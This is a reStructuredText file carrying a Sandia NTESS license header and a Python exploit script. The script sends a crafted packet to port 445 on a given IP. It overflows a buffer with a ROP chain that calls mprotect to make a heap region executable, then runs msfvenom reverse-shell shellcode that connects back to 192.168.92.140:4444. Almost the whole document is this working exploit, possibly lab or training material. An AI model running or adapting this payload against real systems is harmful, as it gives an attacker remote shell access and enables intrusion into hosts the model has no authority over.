.. Copyright 2022 National Technology & Engineering Solutions of Sandia, LLC
   (NTESS).  Under the terms of Contract DE-NA0003525 with NTESS, the U.S.
   Government retains certain rights in this software.
   
   Redistribution and use in source and binary/rendered forms, with or without
   modification, are permitted provided that the following conditions are met:
   
    1. Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.
    2. Redistributions in binary/rendered form must reproduce the above copyright
       notice, this list of conditions and the following disclaimer in the
       documentation and/or other materials provided with the distribution.
    3. Neither the name of the copyright holder nor the names of its contributors
       may be used to endorse or promote products derived from this software
       without specific prior written permission.
   
   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
   ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
   WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
   DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
   FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
   DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
   SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
   CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
   OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

.. code::

 import socket
 import sys
 import hexdump
 import struct
 
 
 header = b"\x81"
 payload = b''
 pre_payload = b''
 packet = b''
 pre_payload = b'\x41' * 34
 garbage = b''
 
 for i in range(int(64/4)):
     for j in range(4):
         garbage += struct.pack("B", 0x41+i)
 
 payload += garbage
 
 #0x0804f7da: pop eax; pop ebx; pop ebp; ret;
 payload += struct.pack('<I', 0x0804f7da)  #'\xda\xf7\x04\x08'
 #Syscall number(EAX)
 #Target Call is 7d, but ECX gadget will add 7 to the lsB, but subtract 1 from msB,
 #so start with 0x86. I now know that I can just change the order the the gadgets
 #to avoid this step.
 payload += struct.pack('<I', 0x86) #b'\x86\x00\x00\x00'
 #Address Start(EBX) 0x08072000
 payload += struct.pack('<I', 0x08072000) #b'\x00\x20\x07\x08'
 #EBP
 payload += b'\x41\x41\x41\x41'
 
 
 #0x080664f5:pop ecx; adc al, 0xf7; ret;
 #Pop ecx gadget
 payload += struct.pack('<I', 0x080664f5)
 #Address Size(ECX)
 payload += struct.pack('<I', 0x4000)
 
 
 #0x08050738 pop edx; pop ebx; pop ebp; ret;
 #Pop edx gadget
 payload += struct.pack('<I', 0x08050738)
 #Prot Flag (EDX)
 payload += struct.pack('<I', 0x07)
 #Address Start(EBX) 0x08072000
 payload += struct.pack('<I', 0x08072000)
 #EBP
 payload += b'\x42\x42\x42\x42'
 
 
 #0xffffe422: int 0x80; pop ebp; pop edx; pop ecx; ret;
 payload += struct.pack('<I', 0xffffe422)
 #Garbage into EBP
 payload += b'\x43\x43\x43\x43'
 #EDX
 payload += b'\x07\x00\x00\x00'
 #ECX
 payload += b'\x00\x40\x00\x00'
 
 #Return Address:Somewhere in our RWX heap
 #0x08075A63 from 0x3A63 offset from 010 Editor
 payload += struct.pack('<I', 0x08075A63)
 
 reverse_shell_ip = '192.168.92.140'
 reverse_shell_port = 4444
 
 
 buf =  b""
 #NOP Sled
 buf += b"\x90" * 0x400
 
 #Payload from msfvenom
 buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
 buf += b"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68"
 buf += socket.inet_aton(reverse_shell_ip)
 buf += b"\x68\x02\x00"
 buf += struct.pack('>H', reverse_shell_port)
 buf += b"\x89\xe1\xb0\x66\x50"
 buf += b"\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
 buf += b"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
 buf += b"\x0b\xcd\x80"
 
 payload += buf
 
 #This doesn't have to match payload size, just need this to be large enough to
 #completely control our overrun
 payload_size = b'\xff'
 
 
 complete_payload = pre_payload + payload_size + payload
 length = struct.pack('>L',len(complete_payload))[1:]
 packet = header + length + complete_payload
 
 
 if len(sys.argv) != 2:
     print("{} <ip>".format(sys.argv[0]))
     sys.exit(1)
 print('Sending:')
 print(hexdump.hexdump(packet))
 ip = sys.argv[1]
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ip,445))
 s.sendall(packet)
 
 data = s.recv(1000)
 print(hexdump.hexdump(data))
 
